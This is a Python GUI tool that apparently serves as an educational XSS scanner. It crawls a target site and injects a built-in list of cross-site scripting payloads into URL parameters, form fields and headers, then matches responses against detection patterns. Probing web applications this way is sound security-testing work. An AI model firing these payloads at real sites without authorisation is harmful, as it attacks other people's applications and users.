# ─ by bnthedev; for educational purposes only  ───
# ─────────────────────────────────────────────────

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse
import time
import json
import os
from datetime import datetime
import re

# ─── XSS Payloads ──────────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert('XSS')>",
    "<svg/onload=alert(1)>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onchange=alert('XSS')><option>1</option></select>",
    "<iframe src=javascript:alert('XSS')>",
    "<object data=javascript:alert('XSS')>",
    "<embed src=javascript:alert('XSS')>",
    "\" onmouseover=\"alert('XSS')\"",
    "' onmouseover='alert(1)'",
    "\"><img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "%3Cscript%3Ealert('XSS')%3C%2Fscript%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script>alert(document.cookie)</script>",
    "<img src=1 onerror=alert(document.domain)>",
    "javascript:alert('XSS')",
    "data:text/html,<script>alert('XSS')</script>",
    "'\"><svg/onload=alert(1)>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<img src=\"jav&#x09;ascript:alert('XSS');\">",
]

DETECTION_PATTERNS = [
    r"<script>alert\(['\"]?XSS['\"]?\)</script>",
    r"<script>alert\(1\)</script>",
    r"<svg[^>]*onload=alert",
    r"<img[^>]*onerror=alert",
    r"onerror=alert\(",
    r"onload=alert\(",
    r"alert\('XSS'\)",
    r"alert\(1\)",
    r"alert\(document\.",
]

# ─── Colors & Fonts ────────────────────────────────────────────────────────────
BG        = "#0d1117"
BG2       = "#161b22"
BG3       = "#21262d"
BORDER    = "#30363d"
GREEN     = "#3fb950"
RED       = "#f85149"
YELLOW    = "#e3b341"
BLUE      = "#58a6ff"
PURPLE    = "#bc8cff"
MUTED     = "#8b949e"
FG        = "#e6edf3"
FONT_MONO = ("Courier New", 10)
FONT_SM   = ("Segoe UI", 9)

LANGUAGES = {
    "English": "en",
    "Cestina": "cs",
    "Русский": "ru",
}


# ─── i18n ──────────────────────────────────────────────────────────────────────
class I18n:
    def __init__(self, lang_dir="lang"):
        base = os.path.dirname(os.path.abspath(__file__))
        self.lang_dir = os.path.join(base, lang_dir)
        self._strings = {}
        self.load("cs")

    def load(self, code):
        path = os.path.join(self.lang_dir, f"{code}.json")
        try:
            with open(path, encoding="utf-8") as f:
                self._strings = json.load(f)
        except FileNotFoundError:
            print(f"[i18n] Language file not found: {path}")

    def t(self, key, **kwargs):
        text = self._strings.get(key, f"[{key}]")
        if kwargs:
            try:
                text = text.format(**kwargs)
            except KeyError:
                pass
        return text


# ─── Main App ──────────────────────────────────────────────────────────────────
class XSSScanner:
    def __init__(self, root):
        self.root = root
        self.i18n = I18n()

        self.root.configure(bg=BG)
        self.root.geometry("1100x760")
        self.root.minsize(900, 600)

        self.scanning      = False
        self.stop_flag     = False
        self.results       = []
        self._tested       = 0
        self._forms_found  = 0
        self._pages_crawled = 0

        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (XSS-Scanner/PenTest)"})

        self._translatable = []

        self._build_ui()

    # ── Language ───────────────────────────────────────────────────────────────
    def _change_language(self, lang_name):
        self.i18n.load(LANGUAGES[lang_name])
        self._apply_translations()

    def _register(self, widget, key, attr="text", **kwargs):
        self._translatable.append((widget, key, attr, kwargs))
        self._apply_one(widget, key, attr, **kwargs)

    def _apply_one(self, widget, key, attr, **kwargs):
        try:
            widget.config(**{attr: self.i18n.t(key, **kwargs)})
        except Exception:
            pass

    def _apply_translations(self):
        self.root.title(self.i18n.t("app_title"))
        for w, k, a, kw in self._translatable:
            self._apply_one(w, k, a, **kw)
        if hasattr(self, "_notebook"):
            self._notebook.tab(0, text=self.i18n.t("tab_log"))
            self._notebook.tab(1, text=self.i18n.t("tab_vulns"))
            self._notebook.tab(2, text=self.i18n.t("tab_payloads", count=len(XSS_PAYLOADS)))
        if hasattr(self, "tree"):
            for col, key in zip(
                ("URL", "Type", "Parameter", "Payload", "Severity"),
                ("col_url", "col_type", "col_param", "col_payload", "col_severity"),
            ):
                self.tree.heading(col, text=self.i18n.t(key))

    # ── UI build ───────────────────────────────────────────────────────────────
    def _build_ui(self):
        # Top bar
        topbar = tk.Frame(self.root, bg=BG2, height=52)
        topbar.pack(fill="x")
        topbar.pack_propagate(False)

        tk.Label(topbar, text="⚡ XSS Scanner",
                 font=("Segoe UI", 14, "bold"), bg=BG2, fg=BLUE
                 ).pack(side="left", padx=18, pady=12)

        subtitle = tk.Label(topbar, font=FONT_SM, bg=BG2, fg=YELLOW)
        subtitle.pack(side="left", padx=4)
        self._register(subtitle, "app_subtitle")

        lang_frame = tk.Frame(topbar, bg=BG2)
        lang_frame.pack(side="right", padx=18)

        lang_lbl = tk.Label(lang_frame, font=FONT_SM, bg=BG2, fg=MUTED)
        lang_lbl.pack(side="left", padx=(0, 4))
        self._register(lang_lbl, "lang_label")

        self.lang_var = tk.StringVar(value="Cestina")
        lang_combo = ttk.Combobox(lang_frame, textvariable=self.lang_var,
                                  values=list(LANGUAGES.keys()),
                                  state="readonly", width=10, font=FONT_SM)
        lang_combo.pack(side="left")
        lang_combo.bind("<<ComboboxSelected>>",
                        lambda e: self._change_language(self.lang_var.get()))

        self.status_dot = tk.Label(topbar, font=FONT_SM, bg=BG2, fg=MUTED)
        self.status_dot.pack(side="right", padx=(0, 8))

        main = tk.Frame(self.root, bg=BG)
        main.pack(fill="both", expand=True, padx=12, pady=8)

        left = tk.Frame(main, bg=BG, width=320)
        left.pack(side="left", fill="y", padx=(0, 8))
        left.pack_propagate(False)

        right = tk.Frame(main, bg=BG)
        right.pack(side="left", fill="both", expand=True)

        self._build_left(left)
        self._build_right(right)

        self._change_language("Cestina")
        self._set_status(self.i18n.t("status_idle"), MUTED)

    def _build_left(self, parent):
        sec1 = tk.Label(parent, font=("Segoe UI", 9, "bold"), bg=BG, fg=MUTED)
        sec1.pack(anchor="w", pady=(10, 3))
        self._register(sec1, "section_target")

        self.url_var = tk.StringVar(value="https://")
        tk.Entry(parent, textvariable=self.url_var, font=FONT_MONO,
                 bg=BG3, fg=FG, insertbackground=FG, bd=0,
                 highlightthickness=1, highlightbackground=BORDER,
                 highlightcolor=BLUE).pack(fill="x", pady=(0, 8), ipady=6, padx=2)

        sec2 = tk.Label(parent, font=("Segoe UI", 9, "bold"), bg=BG, fg=MUTED)
        sec2.pack(anchor="w", pady=(6, 3))
        self._register(sec2, "section_options")

        self.opt_crawl   = tk.BooleanVar(value=True)
        self.opt_forms   = tk.BooleanVar(value=True)
        self.opt_params  = tk.BooleanVar(value=True)
        self.opt_headers = tk.BooleanVar(value=False)
        self.opt_cookies = tk.BooleanVar(value=False)

        for key, var in [
            ("opt_crawl",   self.opt_crawl),
            ("opt_forms",   self.opt_forms),
            ("opt_params",  self.opt_params),
            ("opt_headers", self.opt_headers),
            ("opt_cookies", self.opt_cookies),
        ]:
            cb = tk.Checkbutton(parent, variable=var, font=FONT_SM,
                                bg=BG, fg=FG, selectcolor=BG3,
                                activebackground=BG, activeforeground=FG,
                                bd=0, highlightthickness=0)
            cb.pack(anchor="w", pady=1)
            self._register(cb, key)

        tk.Frame(parent, bg=BORDER, height=1).pack(fill="x", pady=8)

        r1 = tk.Frame(parent, bg=BG)
        r1.pack(fill="x")
        l1 = tk.Label(r1, font=FONT_SM, bg=BG, fg=MUTED)
        l1.pack(side="left")
        self._register(l1, "label_delay")
        self.delay_var = tk.IntVar(value=200)
        tk.Spinbox(r1, from_=0, to=2000, width=6, textvariable=self.delay_var,
                   font=FONT_SM, bg=BG3, fg=FG, buttonbackground=BG3,
                   insertbackground=FG, bd=0,
                   highlightthickness=1, highlightbackground=BORDER).pack(side="right")

        r2 = tk.Frame(parent, bg=BG)
        r2.pack(fill="x", pady=4)
        l2 = tk.Label(r2, font=FONT_SM, bg=BG, fg=MUTED)
        l2.pack(side="left")
        self._register(l2, "label_maxpages")
        self.maxpages_var = tk.IntVar(value=20)
        tk.Spinbox(r2, from_=1, to=200, width=6, textvariable=self.maxpages_var,
                   font=FONT_SM, bg=BG3, fg=FG, buttonbackground=BG3,
                   insertbackground=FG, bd=0,
                   highlightthickness=1, highlightbackground=BORDER).pack(side="right")

        pl_lbl = tk.Label(parent, font=FONT_SM, bg=BG, fg=MUTED)
        pl_lbl.pack(anchor="w", pady=2)
        self._register(pl_lbl, "label_payloads", count=len(XSS_PAYLOADS))

        tk.Frame(parent, bg=BORDER, height=1).pack(fill="x", pady=8)

        sec3 = tk.Label(parent, font=("Segoe UI", 9, "bold"), bg=BG, fg=MUTED)
        sec3.pack(anchor="w", pady=(4, 3))
        self._register(sec3, "section_auth")

        ck_lbl = tk.Label(parent, font=FONT_SM, bg=BG, fg=MUTED)
        ck_lbl.pack(anchor="w")
        self._register(ck_lbl, "label_cookie")
        self.cookie_entry = tk.Entry(parent, font=FONT_MONO, bg=BG3, fg=FG,
                                     insertbackground=FG, bd=0,
                                     highlightthickness=1, highlightbackground=BORDER)
        self.cookie_entry.pack(fill="x", pady=(0, 6), ipady=4, padx=2)

        au_lbl = tk.Label(parent, font=FONT_SM, bg=BG, fg=MUTED)
        au_lbl.pack(anchor="w")
        self._register(au_lbl, "label_auth")
        self.auth_entry = tk.Entry(parent, font=FONT_MONO, bg=BG3, fg=FG,
                                   insertbackground=FG, bd=0,
                                   highlightthickness=1, highlightbackground=BORDER)
        self.auth_entry.pack(fill="x", pady=(0, 8), ipady=4, padx=2)

        self.scan_btn = tk.Button(parent, font=("Segoe UI", 11, "bold"),
                                  bg=GREEN, fg="#0d1117", bd=0, cursor="hand2",
                                  activebackground="#2ea043",
                                  command=self._start_scan)
        self.scan_btn.pack(fill="x", pady=(8, 4), ipady=8)
        self._register(self.scan_btn, "btn_start")

        self.stop_btn = tk.Button(parent, font=("Segoe UI", 10),
                                  bg=BG3, fg=RED, bd=0, cursor="hand2",
                                  activebackground=BORDER,
                                  command=self._stop_scan, state="disabled")
        self.stop_btn.pack(fill="x", ipady=6)
        self._register(self.stop_btn, "btn_stop")

        self.export_btn = tk.Button(parent, font=FONT_SM, bg=BG3, fg=MUTED,
                                    bd=0, cursor="hand2", activebackground=BORDER,
                                    command=self._export)
        self.export_btn.pack(fill="x", pady=(8, 0), ipady=5)
        self._register(self.export_btn, "btn_export")

    def _build_right(self, parent):
        stats = tk.Frame(parent, bg=BG2)
        stats.pack(fill="x", pady=(0, 8))

        self.stat_tested = self._stat(stats, "stat_tested", "0", BLUE)
        tk.Frame(stats, bg=BORDER, width=1).pack(side="left", fill="y")
        self.stat_vulns  = self._stat(stats, "stat_vulns",  "0", RED)
        tk.Frame(stats, bg=BORDER, width=1).pack(side="left", fill="y")
        self.stat_forms  = self._stat(stats, "stat_forms",  "0", PURPLE)
        tk.Frame(stats, bg=BORDER, width=1).pack(side="left", fill="y")
        self.stat_pages  = self._stat(stats, "stat_pages",  "0", GREEN)

        self._notebook = ttk.Notebook(parent)
        self._notebook.pack(fill="both", expand=True)

        style = ttk.Style()
        style.theme_use("default")
        style.configure("TNotebook", background=BG, borderwidth=0)
        style.configure("TNotebook.Tab", background=BG3, foreground=MUTED,
                        padding=[14, 6], font=FONT_SM, borderwidth=0)
        style.map("TNotebook.Tab",
                  background=[("selected", BG2)],
                  foreground=[("selected", FG)])

        log_frame = tk.Frame(self._notebook, bg=BG)
        self._notebook.add(log_frame, text="")
        self.log = scrolledtext.ScrolledText(
            log_frame, font=FONT_MONO, bg=BG, fg=FG,
            insertbackground=FG, selectbackground=BG3,
            bd=0, highlightthickness=0, state="disabled", wrap="word")
        self.log.pack(fill="both", expand=True)
        for tag, color in [("vuln", RED), ("ok", GREEN), ("info", BLUE),
                           ("warn", YELLOW), ("muted", MUTED)]:
            self.log.tag_config(tag, foreground=color)

        vuln_frame = tk.Frame(self._notebook, bg=BG)
        self._notebook.add(vuln_frame, text="")
        self._build_vuln_table(vuln_frame)

        pl_frame = tk.Frame(self._notebook, bg=BG)
        self._notebook.add(pl_frame, text="")
        pl_text = scrolledtext.ScrolledText(pl_frame, font=FONT_MONO, bg=BG,
                                            fg=MUTED, bd=0, highlightthickness=0,
                                            wrap="none")
        pl_text.pack(fill="both", expand=True)
        for i, p in enumerate(XSS_PAYLOADS, 1):
            pl_text.insert("end", f"{i:2}. {p}\n")
        pl_text.config(state="disabled")

    def _build_vuln_table(self, parent):
        cols = ("URL", "Type", "Parameter", "Payload", "Severity")
        self.tree = ttk.Treeview(parent, columns=cols, show="headings", selectmode="browse")

        style = ttk.Style()
        style.configure("Treeview", background=BG2, foreground=FG,
                        fieldbackground=BG2, rowheight=24, font=FONT_SM, borderwidth=0)
        style.configure("Treeview.Heading", background=BG3, foreground=MUTED,
                        font=("Segoe UI", 9, "bold"), borderwidth=0)
        style.map("Treeview", background=[("selected", BG3)])

        for col, w in zip(cols, [320, 80, 100, 260, 80]):
            self.tree.heading(col, text=col)
            self.tree.column(col, width=w, minwidth=60)

        self.tree.tag_configure("high",   foreground=RED)
        self.tree.tag_configure("medium", foreground=YELLOW)

        sy = ttk.Scrollbar(parent, orient="vertical",   command=self.tree.yview)
        sx = ttk.Scrollbar(parent, orient="horizontal", command=self.tree.xview)
        self.tree.configure(yscrollcommand=sy.set, xscrollcommand=sx.set)
        sy.pack(side="right",  fill="y")
        sx.pack(side="bottom", fill="x")
        self.tree.pack(fill="both", expand=True)

        detail_frame = tk.Frame(parent, bg=BG2)
        detail_frame.pack(fill="x")
        dl = tk.Label(detail_frame, font=FONT_SM, bg=BG2, fg=MUTED)
        dl.pack(anchor="w", padx=8, pady=(4, 0))
        self._register(dl, "detail_label")
        self.detail_text = tk.Text(detail_frame, height=4, font=FONT_MONO,
                                   bg=BG2, fg=FG, bd=0, highlightthickness=0,
                                   wrap="word", state="disabled")
        self.detail_text.pack(fill="x", padx=8, pady=(0, 8))
        self.tree.bind("<<TreeviewSelect>>", self._show_detail)

    def _stat(self, parent, label_key, value, color):
        frame = tk.Frame(parent, bg=BG2)
        frame.pack(side="left", expand=True, fill="both", padx=1, pady=1)
        val_lbl = tk.Label(frame, text=value,
                           font=("Courier New", 20, "bold"), bg=BG2, fg=color)
        val_lbl.pack(pady=(8, 0))
        lbl = tk.Label(frame, font=("Segoe UI", 8), bg=BG2, fg=MUTED)
        lbl.pack(pady=(0, 8))
        self._register(lbl, label_key)
        return val_lbl

    def _log(self, msg, tag=""):
        def _do():
            self.log.config(state="normal")
            ts = datetime.now().strftime("%H:%M:%S")
            self.log.insert("end", f"[{ts}] {msg}\n", tag)
            self.log.see("end")
            self.log.config(state="disabled")
        self.root.after(0, _do)

    def _set_status(self, text, color=MUTED):
        self.root.after(0, lambda: self.status_dot.config(
            text=f"● {text}", fg=color))

    def _update_stats(self):
        self.root.after(0, lambda: [
            self.stat_tested.config(text=str(self._tested)),
            self.stat_vulns.config( text=str(len(self.results))),
            self.stat_forms.config( text=str(self._forms_found)),
            self.stat_pages.config( text=str(self._pages_crawled)),
        ])

    def _show_detail(self, _):
        sel = self.tree.selection()
        if not sel:
            return
        v = self.tree.item(sel[0], "values")
        self.detail_text.config(state="normal")
        self.detail_text.delete("1.0", "end")
        self.detail_text.insert("end", self.i18n.t(
            "detail_text", url=v[0], type=v[1], param=v[2],
            severity=v[4], payload=v[3]))
        self.detail_text.config(state="disabled")

    def _start_scan(self):
        url = self.url_var.get().strip()
        if not url or url == "https://":
            messagebox.showwarning(
                self.i18n.t("warn_no_url_title"),
                self.i18n.t("warn_no_url_msg"))
            return
        if not url.startswith("http"):
            url = "https://" + url
            self.url_var.set(url)

        if not messagebox.askyesno(
                self.i18n.t("confirm_title"),
                self.i18n.t("confirm_msg", url=url)):
            return

        self.results.clear()
        self._tested = self._forms_found = self._pages_crawled = 0
        self.log.config(state="normal")
        self.log.delete("1.0", "end")
        self.log.config(state="disabled")
        for item in self.tree.get_children():
            self.tree.delete(item)

        cookie = self.cookie_entry.get().strip()
        auth   = self.auth_entry.get().strip()
        if cookie: self.session.headers.update({"Cookie": cookie})
        if auth:   self.session.headers.update({"Authorization": auth})

        self.stop_flag = False
        self.scanning  = True
        self.scan_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self._set_status(self.i18n.t("status_scanning"), GREEN)

        threading.Thread(target=self._scan_thread, args=(url,), daemon=True).start()

    def _stop_scan(self):
        self.stop_flag = True
        self._log(self.i18n.t("log_stopped"), "warn")

    def _finish_scan(self):
        self.scanning = False
        self.scan_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        count = len(self.results)
        if count > 0:
            self._set_status(self.i18n.t("status_done_vulns", count=count), RED)
            self._log(self.i18n.t("log_done_vulns", count=count), "vuln")
        else:
            self._set_status(self.i18n.t("status_done_clean"), GREEN)
            self._log(self.i18n.t("log_done_clean"), "ok")

    # ── Scan logic ─────────────────────────────────────────────────────────────
    def _scan_thread(self, base_url):
        try:
            self._log(self.i18n.t("log_start", url=base_url), "info")
            urls_to_test = [base_url]

            if self.opt_crawl.get():
                self._log(self.i18n.t("log_crawling"), "info")
                crawled = self._crawl(base_url)
                urls_to_test = list(set(urls_to_test + crawled))
                self._log(self.i18n.t("log_crawled", count=len(urls_to_test)), "muted")

            for url in urls_to_test:
                if self.stop_flag:
                    break
                self._test_url(url)

            self.root.after(0, self._finish_scan)
        except Exception as e:
            self._log(self.i18n.t("log_error", error=e), "warn")
            self.root.after(0, self._finish_scan)

    def _crawl(self, base_url):
        visited, to_visit, found = set(), [base_url], []
        domain = urlparse(base_url).netloc
        max_p  = self.maxpages_var.get()

        while to_visit and len(visited) < max_p and not self.stop_flag:
            url = to_visit.pop(0)
            if url in visited:
                continue
            visited.add(url)
            try:
                resp = self.session.get(url, timeout=8, allow_redirects=True)
                self._pages_crawled += 1
                self._update_stats()
                soup = BeautifulSoup(resp.text, "html.parser")
                for tag in soup.find_all("a", href=True):
                    href = urljoin(url, tag["href"])
                    if urlparse(href).netloc == domain and href not in visited:
                        to_visit.append(href)
                        if href not in found:
                            found.append(href)
            except Exception:
                pass
            time.sleep(self.delay_var.get() / 1000)

        return found

    def _test_url(self, url):
        self._log(self.i18n.t("log_testing", url=url), "muted")
        parsed = urlparse(url)

        if self.opt_params.get():
            params = parse_qs(parsed.query)
            if params:
                self._log(self.i18n.t("log_params", params=list(params.keys())), "muted")
                for param in params:
                    for payload in XSS_PAYLOADS:
                        if self.stop_flag: return
                        self._test_param(url, param, payload)
                        self._tested += 1
                        self._update_stats()
                        time.sleep(self.delay_var.get() / 1000)

        if self.opt_forms.get():
            try:
                resp = self.session.get(url, timeout=8)
                soup = BeautifulSoup(resp.text, "html.parser")
                forms = soup.find_all("form")
                if forms:
                    self._log(self.i18n.t("log_forms", count=len(forms)), "muted")
                    self._forms_found += len(forms)
                    self._update_stats()
                for form in forms:
                    if self.stop_flag: return
                    self._test_form(url, form)
            except Exception as e:
                self._log(self.i18n.t("log_page_error", error=e), "warn")

        if self.opt_headers.get():
            for payload in XSS_PAYLOADS[:5]:
                if self.stop_flag: return
                self._test_header(url, "User-Agent", payload)
                self._test_header(url, "Referer",    payload)
                self._tested += 2
                self._update_stats()
                time.sleep(self.delay_var.get() / 1000)

    def _test_param(self, url, param, payload):
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
            resp = self.session.get(test_url, timeout=8)
            if self._detect_xss(resp.text, payload):
                sev = "HIGH" if "<script>" in payload.lower() else "MEDIUM"
                self._report_vuln(url, "URL param", param, payload, sev)
        except Exception:
            pass

    def _test_form(self, page_url, form):
        try:
            action = urljoin(page_url, form.get("action", page_url))
            method = form.get("method", "get").lower()
            fields = {}
            for inp in form.find_all(["input", "textarea", "select"]):
                name  = inp.get("name", "")
                if not name: continue
                itype = inp.get("type", "text").lower()
                if itype in ("submit", "button", "image", "reset"):
                    fields[name] = inp.get("value", "submit")
                elif itype == "checkbox":
                    fields[name] = "on"
                else:
                    fields[name] = inp.get("value", "test")

            testable = [f for f in fields if fields[f] in ("test", "")
                        or not any(v in fields[f] for v in ("submit", "on"))]

            for field_name in testable:
                for payload in XSS_PAYLOADS:
                    if self.stop_flag: return
                    test_fields = {**fields, field_name: payload}
                    try:
                        if method == "post":
                            resp = self.session.post(action, data=test_fields, timeout=8)
                        else:
                            resp = self.session.get(action, params=test_fields, timeout=8)
                        self._tested += 1
                        self._update_stats()
                        if self._detect_xss(resp.text, payload):
                            sev = "HIGH" if "<script>" in payload.lower() else "MEDIUM"
                            self._report_vuln(action, f"Form ({method.upper()})", field_name, payload, sev)
                    except Exception:
                        pass
                    time.sleep(self.delay_var.get() / 1000)
        except Exception as e:
            self._log(self.i18n.t("log_form_error", error=e), "warn")

    def _test_header(self, url, header, payload):
        try:
            resp = self.session.get(url, headers={header: payload}, timeout=8)
            if self._detect_xss(resp.text, payload):
                self._report_vuln(url, "Header", header, payload, "MEDIUM")
        except Exception:
            pass

    def _detect_xss(self, response_text, payload):
        if payload in response_text:
            return True
        for pattern in DETECTION_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def _report_vuln(self, url, vuln_type, param, payload, severity):
        self.results.append({
            "url": url, "type": vuln_type, "param": param,
            "payload": payload, "severity": severity,
            "time": datetime.now().isoformat()
        })
        self._log(self.i18n.t("log_vuln_found",   severity=severity), "vuln")
        self._log(self.i18n.t("log_vuln_url",      url=url),          "vuln")
        self._log(self.i18n.t("log_vuln_detail",   type=vuln_type, param=param), "vuln")
        self._log(self.i18n.t("log_vuln_payload",  payload=payload),  "vuln")

        tag = "high" if severity == "HIGH" else "medium"
        su  = url     if len(url)     <= 50 else url[:47]     + "..."
        sp  = payload if len(payload) <= 50 else payload[:47] + "..."
        self.root.after(0, lambda: self.tree.insert(
            "", "end",
            values=(su, vuln_type, param, sp, severity),
            tags=(tag,)))

    def _export(self):
        if not self.results:
            messagebox.showinfo(
                self.i18n.t("export_title"),
                self.i18n.t("export_empty"))
            return
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        name = self.i18n.t("export_default_name", timestamp=ts)
        path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON", "*.json"), ("Text", "*.txt"), ("All", "*.*")],
            initialfile=name)
        if not path:
            return
        with open(path, "w", encoding="utf-8") as f:
            json.dump({
                "scan_time": datetime.now().isoformat(),
                "target":    self.url_var.get(),
                "total_vulnerabilities": len(self.results),
                "vulnerabilities": self.results,
            }, f, indent=2, ensure_ascii=False)
        messagebox.showinfo(
            self.i18n.t("export_title"),
            self.i18n.t("export_saved", path=path))


if __name__ == "__main__":
    root = tk.Tk()
    app  = XSSScanner(root)
    root.mainloop()